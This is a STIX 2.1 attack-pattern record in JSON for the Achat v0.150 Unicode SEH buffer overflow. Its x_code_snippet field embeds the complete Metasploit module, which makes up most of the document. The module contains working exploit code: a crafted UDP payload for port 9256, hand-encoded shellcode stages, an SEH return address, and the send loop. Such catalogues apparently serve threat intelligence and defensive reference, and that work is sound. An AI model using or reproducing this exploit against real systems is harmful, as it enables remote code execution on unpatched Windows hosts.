{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--62d8a2ff-f9fe-4ae9-a24a-143f63b1b0e2",
    "created": "2024-08-14T16:46:44.866257Z",
    "modified": "2024-08-14T16:46:44.866262Z",
    "name": "Achat Unicode SEH Buffer Overflow",
    "description": " This module exploits a Unicode SEH buffer overflow in Achat. By sending a crafted message to the default port 9256/UDP, it's possible to overwrite the SEH handler. Even when the exploit is reliable, it depends on timing since there are two threads overflowing the stack in the same time. This module has been tested on Achat v0.150 running on Windows XP SP3 and Windows 7. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/achat_bof.rb",
            "external_id": "achat_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Achat Unicode SEH Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a Unicode SEH buffer overflow in Achat. By\n        sending a crafted message to the default port 9256/UDP, it's possible to overwrite the\n        SEH handler. Even when the exploit is reliable, it depends on timing since there are\n        two threads overflowing the stack in the same time. This module has been tested on\n        Achat v0.150 running on Windows XP SP3 and Windows 7.\n      },\n      'Author'         =>\n        [\n          'Peter Kasza <peter.kasza[at]itinsight.hu>', # Vulnerability discovery\n          'Balazs Bucsay <balazs.bucsay[at]rycon.hu>' # Exploit, Metasploit module\n        ],\n      'License'\t       => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CWE', '121'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'    => 730,\n          'BadChars' => \"\\x00\" + (0x80..0xff).to_a.pack(\"C*\"),\n          'StackAdjustment' => -3500,\n          'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,\n          'EncoderOptions'  =>\n            {\n              'BufferRegister' => 'EAX'\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested OK Windows XP SP3, Windows 7\n          # Not working on Windows Server 2003\n          [ 'Achat beta v0.150 / Windows XP SP3 / Windows 7 SP1', { 'Ret' => \"\\x2A\\x46\" } ] #ppr from AChat.exe\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-12-18'))\n\n    register_options(\n      [\n        Opt::RPORT(9256)\n      ])\n  end\n\n  def exploit\n    connect_udp\n\n    # 0055 00          ADD BYTE PTR SS:[EBP],DL # padding\n    # 2A00             SUB AL,BYTE PTR DS:[EAX] # padding\n    # 55               PUSH EBP                 # ebp holds a close pointer to the payload\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 58               POP EAX                  # mov eax, ebp\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 05 00140011      ADD EAX,11001400         # adjusting eax\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 2D 00130011      SUB EAX,11001300         # lea eax, eax+100\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 50               PUSH EAX                 # eax points to the start of the shellcode\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 58               POP EAX                  # padding\n    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding\n    # 59               POP ECX                  # padding\n    # 0039             ADD BYTE PTR DS:[ECX],BH # padding\n    first_stage = \"\\x55\\x2A\\x55\\x6E\\x58\\x6E\\x05\\x14\\x11\\x6E\\x2D\\x13\\x11\\x6E\\x50\\x6E\\x58\\x43\\x59\\x39\"\n\n    sploit = 'A0000000002#Main' + \"\\x00\" + 'Z' * 114688 + \"\\x00\" + \"A\" * 10 + \"\\x00\"\n    sploit << 'A0000000002#Main' + \"\\x00\" + 'A' * 57288 + 'AAAAASI' * 50 + 'A' * (3750 - 46)\n    sploit << \"\\x62\" + 'A' * 45 # 0x62 will be used to calculate the right offset\n    sploit << \"\\x61\\x40\" # POPAD + INC EAX\n\n    sploit << target.ret # AChat.exe p/p/r address\n\n    # adjusting the first thread's unicode payload, tricky asm-fu\n    # the first seh exception jumps here, first_stage variable will be executed\n    # by the second seh exception as well. It needs to be in sync with the second\n    # thread, so that is why we adjust eax/ebp to have a close pointer to the\n    # payload, then first_stage variable will take the rest of the job.\n    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding\n    # 55               PUSH EBP                 # ebp with close pointer to payload\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 58               POP EAX                  # put ebp to eax\n    # 006E 00          ADD BYTE PTR DS:[ESI],CH # padding\n    # 2A00             SUB AL,BYTE PTR DS:[EAX] # setting eax to the right place\n    # 2A00             SUB AL,BYTE PTR DS:[EAX] # adjusting eax a little bit more\n    # 05 00140011      ADD EAX,11001400         # more adjusting\n    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding\n    # 2D 00130011      SUB EAX,11001300         # lea eax, eax+100\n    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding\n    # 50               PUSH EAX\t\t\t# saving eax\n    # 0043 00          ADD BYTE PTR DS:[EBX],AL # padding\n    # 5D               POP EBP\t\t\t# mov ebp, eax\n    sploit << \"\\x43\\x55\\x6E\\x58\\x6E\\x2A\\x2A\\x05\\x14\\x11\\x43\\x2d\\x13\\x11\\x43\\x50\\x43\\x5D\" + 'C' * 9 + \"\\x60\\x43\"\n    sploit << \"\\x61\\x43\" + target.ret # second nseh entry, for the second thread\n    sploit << \"\\x2A\" + first_stage + 'C' * (157 - first_stage.length - 31 -3) # put address of the payload to EAX\n    sploit << payload.encoded + 'A' * (1152 - payload.encoded.length) # placing the payload\n    sploit << \"\\x00\" + 'A' * 10 + \"\\x00\"\n\n    i = 0\n    while i < sploit.length do\n      if i > 172000\n        Rex::sleep(1.0)\n      end\n      sent = udp_sock.put(sploit[i..i + 8192 - 1])\n      i += sent\n    end\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-18",
    "x_mitre_platforms": [
        "win'"
    ]
}